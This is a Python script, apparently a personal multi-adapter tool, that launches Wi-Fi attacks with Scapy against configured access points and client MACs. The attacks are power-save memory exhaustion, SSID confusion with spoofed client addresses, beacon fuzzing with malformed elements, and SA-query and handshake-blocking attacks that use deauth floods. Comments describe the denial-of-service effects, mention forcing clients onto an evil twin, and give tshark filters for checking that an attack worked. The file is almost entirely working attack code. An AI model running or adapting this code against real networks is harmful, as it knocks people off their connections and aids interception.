#!/usr/bin/env python3
import subprocess
import time
import os
import sys
import csv
import glob
import random
from multiprocessing import Process, Value

# =====================================================================================
# ======================== CENTRAL CONFIGURATION (EVERYTHING IN ONE PLACE) ========================
# =====================================================================================

# --- 1. TARGET DATA: MAIN NETWORK ---
# BSSIDs of the network primarily being attacked and to which the target clients are connected.
TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"
TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"

# --- 2. TARGET DATA: GUEST NETWORK (ONLY FOR 'ssid_confusion') ---
# BSSID of the SECOND network (e.g., guest network) needed for the confusion attack.
# MUST HAVE A DIFFERENT SSID THAN THE MAIN NETWORK!
TARGET_BSSID_GASTNETZ = "82:67:72:81:9C:6F" # Example, please adapt

# --- 3. OPTIONAL SCANNER ---
# IMPORTANT: The scanner is MANDATORY for the 'ssid_confusion' attack!
SCANNER_INTERFACE = "wlan1mon" # e.g. "wlan0mon" or ""

# --- 4. MANUAL CHANNEL ASSIGNMENT (Only for attacks WITHOUT scanner dependency) ---
MANUELLER_KANAL_5GHZ = "52"    # Channel for MAIN NETWORK 5 GHz
MANUELLER_KANAL_2_4GHZ = "7"   # Channel for MAIN NETWORK 2.4 GHz
MANUELLER_KANAL_GASTNETZ = "7" # Channel for GUEST NETWORK

# --- 5. TARGET CLIENTS (Clients normally connected to the MAIN NETWORK) ---
TARGET_STA_MACS = [
    "30:34:DB:11:48:09",
    "B2:5D:F9:73:10:6C"#,
#    "6C:99:9D:95:70:8F",
#    "6E:8F:9F:B4:3D:10"#,
#    "82:49:2C:43:16:81"
]

# ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
#
# --- Category: Modern Attacks (2023+) ---
#
# "power_save_exhaustion": Overflows the router's RAM by abusing the Power-Save feature.
#     Analogy: Imagine the router is a post office. The attacker pretends to be a client but says:
#              "I am on vacation, please hold all my packages." The attacker repeats this with hundreds
#              of fake identities. The post office storage fills up with undeliverable packages until it collapses.
#     Method: The script sends frames from countless fake MAC addresses to the AP, setting the
#             "Power-Save" bit. The AP then begins buffering all traffic intended for these "sleeping"
#             clients in its RAM. This quickly leads to Memory Exhaustion.
#     Effect: Denial-of-Service. The router crashes or becomes extremely slow.
#
# "ssid_confusion": Confuses the router's security logic involving multiple SSIDs (uses TARGET_BSSID_5GHZ and _2_4GHZ).
#     Analogy: The router is a bouncer for a VIP party (secure net) and a public party (guest net).
#              The attacker, who is at the public party, fakes the ID of a VIP guest. The bouncer
#              gets confused: "I know this VIP, but why is he at the wrong party?". This confusion
#              leads to the bouncer incorrectly handling the real VIP guest.
#     Method: Requires a setup with at least two SSIDs (e.g., Main and Guest network). The attacker spoofs the MAC address
#             of a legitimate client from the secure network (TARGET_STA_MACS) but sends packets that look like
#             they belong to the insecure guest network (TARGET_BSSID_GUEST).
#     Effect: The router's internal state management is disrupted. This can lead to packets from the
#             real client being dropped (DoS) or, in the worst case, security protocols being bypassed.
#
# "buffer_overflow_fuzzer": Bombards the AP with oversized/malformed packets in hopes of triggering a crash (Zero-Day).
#     IMPORTANT: This is not a targeted exploit but a "Fuzzing" approach. Success is not guaranteed!
#     Analogy: Imagine the Wi-Fi chip firmware as software controlling a car engine.
#              The attacker sends nonsensical commands via the onboard computer like "Accelerate to
#              500,000 RPM". The software is not prepared for this, which can lead to a buffer overflow.
#              Best case: the engine crashes; worst case: the attacker takes control.
#     Method: The script bombards the AP with a multitude of intentionally "broken" or oversized
#             Wi-Fi frames. For example, it sends Beacon frames with a 300-character SSID (limit is 32)
#             or frames with hundreds of "Vendor Specific" elements.
#     Effect: If successful, an unknown bug (Zero-Day) in the router firmware is exploited, leading to
#             a Denial-of-Service (Crash) or theoretically even Remote Code Execution.
#
# "sa_query_abuse": Exploits the PMF protection mechanism to reliably disconnect a client.
#     What is this attack for? This is an extremely reliable Denial-of-Service attack against modern clients in
#                              a WPA3 network. It is often more effective than a simple Deauth Flood.
#     What can you do with it? You can targetedly and permanently disconnect a client from the network, e.g.,
#                              to force it to connect to a weaker network or an Evil Twin.
#     How to measure success? Start tshark with the filter `wlan.addr == <Client-MAC> and wlan.fc.type_subtype == 0x0c`.
#                             A successful attack causes the **client itself** to send a **Deauthentication Frame**
#                             after a timeout to terminate the connection.
#
#
# "handshake_block": Prevents a client from completing the 4-Way Handshake.
#
#     What is this attack for? It prevents a client from connecting to the network in the first place.
#                              It is particularly effective at stopping a client from immediately reconnecting
#                              after being kicked out.
#     What can you do with it? This attack is the perfect "companion" for a Deauth Flood. While the Deauth Flood
#                              kicks the client out, the Handshake Block ensures the door remains locked.
#     How to measure success? Start tshark with the filter `wlan.addr == <Client-MAC> and (eapol or wlan.fc.type_subtype == 0x0c)`.
#                             You will see the client sending an Association Request, but the 4-Way Handshake
#                             (EAPOL packets) is never completed. After approx. 10-15 seconds, the client will
#                             give up and send a Deauthentication Frame.
#sudo tshark -i wlan5mon -Y "(wlan.sa == 56:14:9A:6D:10:2F || wlan.addr == 7C:0A:3F:6E:A1:58 || wlan.addr == 82:49:2C:43:16:81) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
#sudo tshark -i wlan2mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 7C:0A:3F:6E:A1:58 || wlan.addr == 16:08:57:DB:66:80 || wlan.addr == 82:49:2C:43:16:81) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
#sudo tshark -i wlan3mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 7C:0A:3F:6E:A1:58 || wlan.addr == 16:08:57:DB:66:80 || wlan.addr == 82:49:2C:43:16:81) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
# --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
ADAPTER_KONFIGURATION = {
#    "wlan2mon": {"band": "5GHz", "angriff": "sa_query_abuse"},
#    "wlan3mon": {"band": "5GHz", "angriff": "sa_query_abuse"},
#    "wlan3mon": {"band": "5GHz", "angriff": "ssid_confusion"},
#    "wlan4mon": {"band": "5GHz", "angriff": "ssid_confusion"}#,
#    "wlan3mon": {"band": "5GHz", "angriff": "sa_query_abuse"},
    "wlan3mon": {"band": "2.4GHz", "angriff": "ssid_confusion"},
    "wlan4mon": {"band": "2.4GHz", "angriff": "ssid_confusion"}#,
#    "wlan4mon": {"band": "2.4GHz", "angriff": "handshake_block"}#,
#    "wlan0": {"band": "2.4GHz", "angriff": "handshake_block"}
}
# ================= HOW TO VERIFY ATTACK SUCCESS =================
#
# --- METHOD 1: CHECK SUCCESS FOR AP ATTACKS (BEACON JITTER) ---
# For attacks that overload the AP (open_auth, buffer_overflow_fuzzer, power_save_exhaustion).
# INSTRUCTION: sudo tshark -i <monitor_iface> -Y "wlan.fc.type_subtype == 8 && wlan.addr == <TARGET_BSSID>" -T fields -e frame.time_delta_displayed
#              sudo tshark -i wlan7mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == D4:86:60:A3:F9:6F" -T fields -e frame.time_delta_displayed
#              sudo tshark -i wlan2mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == D4:86:60:A3:F9:6E" -T fields -e frame.time_delta_displayed
# RESULT: Values SIGNIFICANTLY larger than 0.1024 (e.g., 0.5, 1.2) indicate a successful attack.
#
# --- METHOD 2: CHECK SUCCESS FOR CLIENT DISCONNECTION ATTACKS ---
# For attacks that disconnect the client directly (deauth_flood).
# INSTRUCTION: sudo tshark -i <monitor_iface> -Y "wlan.addr == <CLIENT_MAC> and wlan.fc.type_subtype == 0x0c"
#              sudo tshark -i wlan7mon -Y "(wlan.addr == 6A:6B:18:3C:91:4F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0c)"
#              sudo tshark -i wlan7mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0c)"
# RESULT: You will see a flood of Deauthentication frames from the AP to the client.
#
# --- METHOD 3: CHECK SUCCESS OF "FRAMING FRAMES" ATTACKS (NEW) ---
#
# A) For "queue_leak":
#    Goal: See cleartext data packets.
#    Command: sudo tshark -i <monitor_iface> -Y "wlan.addr == <CLIENT_MAC> and not wlan.fc.protected"
#    Success: You suddenly see QoS Data frames in the output. These are the unencrypted, leaked packets.
#
# B) For "sa_query_abuse":
#    Goal: See the client disconnecting itself.
#    Command: sudo tshark -i <monitor_iface> -Y "wlan.addr == <CLIENT_MAC> and wlan.fc.type_subtype == 0x0c"
#             sudo tshark -i wlan7mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0c)"
#             sudo tshark -i wlan3mon -Y "(wlan.addr == 6A:6B:18:3C:91:4F) && (eapol || wlan.fc.type_subtype == 0x0c)"
#             sudo tshark -i wlan6mon -Y "(wlan.addr == 6A:6B:18:3C:91:4F) && (eapol || wlan.fc.type_subtype == 0x0c)"
#    Success: You see a Deauthentication frame where the SOURCE address is the client. This proves it kicked itself out.
#
#
# C) For "handshake_block":
#    Goal: See the 4-Way Handshake failing.
#    Command: sudo tshark -i <monitor_iface> -Y "wlan.addr == <CLIENT_MAC> and (eapol or wlan.fc.type_subtype == 0x0c)"
#    Success: The client tries to connect (Association), but NO EAPOL packets appear. After approx. 10-15s, you see a Deauthentication frame from the client.
#
#sudo tshark -i wlan4mon -Y "(wlan.addr == 56:14:9A:6D:10:2F or wlan.addr == 16:08:57:DB:66:80 or wlan.addr == 7C:0A:3F:6E:A1:58 or wlan.addr == 82:49:2C:43:16:81) and (eapol or wlan.fc.type_subtype == 0x0a or wlan.fc.type_subtype == 0x0c)"
# ==============================================================================================

# ======================== SCRIPT LOGIC STARTS HERE ========================
def run_power_save_attack_process(interface, bssid, channel, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, RandMAC
    print(f"[INFO-PS] Process for {interface} (power_save_exhaustion) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e: print(f"[ERROR-PS] Channel switch for {interface} failed: {e}"); return
    try:
        while True:
            dot11 = Dot11(type=2, subtype=4, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)
            dot11.FCfield |= 0x10
            packet = RadioTap()/dot11
            sendp(packet, count=200, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 200
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_ssid_confusion_attack_process(interface, guest_bssid, guest_channel, counter, sta_macs=None, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    
    print(f"[INFO-SSID-CONF] Special process for {interface} started.")
    if not sta_macs:
        print(f"[ERROR-SSID-CONF] {interface}: Attack requires TARGET_STA_MACS. Process paused.")
        time.sleep(999); return
    
    try:
        while True:
            print(f"[INFO-SSID-CONF] {interface}: Switching to target channel {guest_channel} of the guest network...")
            try:
                subprocess.run(['iwconfig', interface, 'channel', guest_channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                print(f"[ERROR-SSID-CONF] {interface}: Channel switch to {guest_channel} failed: {e}"); time.sleep(5); continue

            spoofed_mac = random.choice(sta_macs)
            print(f"[INFO-SSID-CONF] {interface}: Sending attack from {spoofed_mac} to guest network {guest_bssid}.")
            
            dot11 = Dot11(type=0, subtype=11, addr1=guest_bssid, addr2=spoofed_mac, addr3=guest_bssid)
            packet = RadioTap()/dot11/Dot11Auth(algo=0, seqnum=1, status=0)
            
            sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 100
            time.sleep(5)
    except KeyboardInterrupt: pass

def run_buffer_overflow_fuzzer_process(interface, bssid, channel, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt, RandMAC
    print(f"[INFO-FUZZ] Process for {interface} (buffer_overflow_fuzzer) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e: print(f"[ERROR-FUZZ] Channel switch for {interface} failed: {e}"); return
    def create_fuzz_packet():
        mac = str(RandMAC())
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
        beacon = Dot11Beacon(cap=0x431)
        fuzz_method = random.randint(1, 3)
        if fuzz_method == 1: return RadioTap()/dot11/beacon/Dot11Elt(ID='SSID', info=os.urandom(255))
        elif fuzz_method == 2:
            packet = RadioTap()/dot11/beacon/Dot11Elt(ID='SSID', info='FuzzNet')
            for _ in range(30): packet /= Dot11Elt(ID=221, info=b"FUZZ" + os.urandom(10))
            return packet
        else: return RadioTap()/dot11/beacon/Dot11Elt(ID='SSID', info='FuzzNet')/Dot11Elt(ID='RSNinfo', info=os.urandom(255))
    try:
        while True:
            packet = create_fuzz_packet()
            sendp(packet, count=50, inter=0.02, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 50
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_framing_frames_attack_process(interface, bssid, channel, counter, attack_type, sta_macs=None, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Deauth
    print(f"[INFO-FRAMING] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e: print(f"[ERROR-FRAMING] Channel switch for {interface} failed: {e}"); return
    if not sta_macs:
        print(f"[WARNING-FRAMING] No target client for {interface}. Process paused."); time.sleep(999); return
    try:
        while True:
            target_sta = random.choice(sta_macs)
            if attack_type == "sa_query_abuse":
                p_assoc_sleep = RadioTap()/Dot11(type=0, subtype=0, addr1=bssid, addr2=target_sta, addr3=bssid)/Dot11AssoReq()
                p_assoc_sleep.FCfield |= 0x10
                sendp(p_assoc_sleep, count=10, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 10
                time.sleep(10)
            elif attack_type == "handshake_block":
                p_deauth = RadioTap()/Dot11(addr1=target_sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(p_deauth, count=25, inter=0.005, iface=interface, verbose=0)
                time.sleep(0.1)
                p_sleep = RadioTap()/Dot11(type=2, subtype=4, addr1=bssid, addr2=target_sta, addr3=bssid)
                p_sleep.FCfield |= 0x10
                sendp(p_sleep, count=50, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 75
                time.sleep(1)
    except KeyboardInterrupt: pass

def get_target_info_from_csv(csv_file_path):
    found_aps = {}
    result = {'valid_ssid_confusion': False, 'main_5ghz': None, 'main_2_4ghz': None, 'guest': None}
    try:
        with open(csv_file_path, 'r', errors='ignore') as f: lines = f.readlines()
        for line in lines:
            if "BSSID, First time seen" in line or "Station MAC" in line: continue
            parts = [p.strip() for p in line.split(',')]
            if len(parts) > 13:
                bssid, channel_str, ssid = parts[0].upper(), parts[3], parts[13]
                if not channel_str or not channel_str.isdigit() or int(channel_str) <= 0: continue
                found_aps[bssid] = {'channel': channel_str, 'ssid': ssid}

        main_5ghz_info = found_aps.get(TARGET_BSSID_5GHZ.upper())
        main_2_4ghz_info = found_aps.get(TARGET_BSSID_2_4GHZ.upper())
        guest_info = found_aps.get(TARGET_BSSID_GASTNETZ.upper())

        if main_5ghz_info: result['main_5ghz'] = main_5ghz_info
        if main_2_4ghz_info: result['main_2_4ghz'] = main_2_4ghz_info
        if guest_info: result['guest'] = guest_info

        # Validation for SSID Confusion
        if main_5ghz_info and guest_info and main_5ghz_info['ssid'] != guest_info['ssid']:
            result['valid_ssid_confusion'] = True
    except Exception: pass
    return result

def cleanup(proc_dict):
    print("\n[INFO] Cleaning up and terminating all processes...")
    for proc in proc_dict.values():
        if isinstance(proc, (Process, subprocess.Popen)):
            try:
                if isinstance(proc, Process) and proc.is_alive(): proc.terminate()
                elif isinstance(proc, subprocess.Popen) and proc.poll() is None: proc.kill()
            except Exception: pass
    for f in glob.glob("scan_result*"):
        try: os.remove(f)
        except OSError: pass
    print("[INFO] Cleanup completed.")

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] This script must be run with sudo privileges.")
    
    print("[INFO] Cleaning up old scan files...")
    for f in glob.glob("scan_result*"):
        try: os.remove(f)
        except OSError as e: print(f"[WARNING] Could not delete old scan file {f}: {e}")
    
    ssid_confusion_in_use = any('ssid_confusion' in conf['angriff'] for conf in ADAPTER_KONFIGURATION.values())
    scanner_aktiv = bool(SCANNER_INTERFACE)
    manuelle_zuweisung = bool(MANUELLER_KANAL_5GHZ and MANUELLER_KANAL_2_4GHZ and MANUELLER_KANAL_GASTNETZ)

    if ssid_confusion_in_use and not scanner_aktiv:
        sys.exit("[ERROR] The 'ssid_confusion' attack mandatorily requires an active SCANNER_INTERFACE.")
    if not scanner_aktiv and not manuelle_zuweisung:
        sys.exit("[ERROR] Scanner is disabled, but no manual channels were entered.")
    if not ADAPTER_KONFIGURATION:
        sys.exit("[ERROR] No attack adapters defined in ADAPTER_KONFIGURATION.")

    current_targets = {'valid_ssid_confusion': False, 'main_5ghz': None, 'main_2_4ghz': None, 'guest': None}
    csv_filename = None
    procs = {}; counters = {iface: Value('L', 0) for iface in ADAPTER_KONFIGURATION}

    try:
        if manuelle_zuweisung and not scanner_aktiv:
            print("[INFO] Manual channel assignment active (SSID-Confusion not validated).")
            current_targets['main_5ghz'] = {'channel': MANUELLER_KANAL_5GHZ}
            current_targets['main_2_4ghz'] = {'channel': MANUELLER_KANAL_2_4GHZ}
            current_targets['guest'] = {'channel': MANUELLER_KANAL_GASTNETZ}
        elif scanner_aktiv:
            print(f"[INFO] Starting channel & SSID scan with {SCANNER_INTERFACE}...")
            procs['scanner'] = subprocess.Popen(['airodump-ng', SCANNER_INTERFACE, '--band', 'abg', '--write', 'scan_result', '--output-format', 'csv'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            scan_duration = 90
            for i in range(scan_duration):
                files = glob.glob("scan_result*.csv")
                if files:
                    csv_filename = files[0]
                    parsed_info = get_target_info_from_csv(csv_filename)
                    current_targets = parsed_info
                    if ssid_confusion_in_use and parsed_info['valid_ssid_confusion']:
                        print("\n[SUCCESS] Multi-SSID setup validated! Main and guest network found.")
                        break
                    elif not ssid_confusion_in_use and parsed_info['main_5ghz'] and parsed_info['main_2_4ghz']:
                         print("\n[SUCCESS] Both main networks found!")
                         break

                status_main = f"CH {current_targets['main_5ghz']['channel']}" if current_targets.get('main_5ghz') else "Searching..."
                status_guest = f"CH {current_targets['guest']['channel']}" if current_targets.get('guest') else "Searching..."
                sys.stdout.write(f"\r[INFO] Scan: [Main: {status_main}] [Guest: {status_guest}] ({i+1}/{scan_duration}s)"); sys.stdout.flush()
                time.sleep(1)
            
            if ssid_confusion_in_use and not current_targets['valid_ssid_confusion']:
                sys.exit("\n[ERROR] 'ssid_confusion' attack aborted: No valid Multi-SSID setup found.")

        print("\n[INFO] Starting attack processes...")
        while True:
            if scanner_aktiv and csv_filename:
                current_targets = get_target_info_from_csv(csv_filename)

            for interface, config in ADAPTER_KONFIGURATION.items():
                if interface not in procs or not procs[interface].is_alive():
                    band, attack_type = config['band'], config['angriff']
                    
                    target_process = None
                    kwargs = {'sta_macs': TARGET_STA_MACS}
                    
                    if attack_type == "ssid_confusion":
                        if current_targets.get('guest'):
                            target_process = run_ssid_confusion_attack_process
                            args = (interface, TARGET_BSSID_GASTNETZ, current_targets['guest']['channel'], counters[interface])
                        else:
                            print(f"[WARNING] '{attack_type}' for {interface} waiting for guest network information."); continue
                    else:
                        target_info = current_targets.get('main_5ghz' if band == '5GHz' else 'main_2_4ghz')
                        if not target_info: 
                            print(f"[WARNING] '{attack_type}' for {interface} waiting for info for the {band} band."); continue
                        
                        channel = target_info['channel']
                        bssid = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
                        
                        if attack_type in ["sa_query_abuse", "handshake_block"]: target_process = run_framing_frames_attack_process
                        elif "power_save" in attack_type: target_process = run_power_save_attack_process
                        elif "buffer_overflow" in attack_type: target_process = run_buffer_overflow_fuzzer_process
                        else: print(f"[WARNING] Unknown attack type '{attack_type}' for {interface}."); continue
                        
                        kwargs['attack_type'] = attack_type
                        args = (interface, bssid, channel, counters[interface])

                    procs[interface] = Process(target=target_process, args=args, kwargs=kwargs)
                    procs[interface].start()

            status_line = " | ".join([f"{iface}({conf['angriff'][:6]}..): {counters[interface].value}" for iface, conf in ADAPTER_KONFIGURATION.items()])
            sys.stdout.write(f"\r[RUNNING] {status_line}"); sys.stdout.flush()
            time.sleep(5)

    except (FileNotFoundError, RuntimeError) as e: print(f"\n{e}")
    except KeyboardInterrupt: print("\n[INFO] User cancellation detected.")
    finally: cleanup(procs)

if __name__ == "__main__":
    main()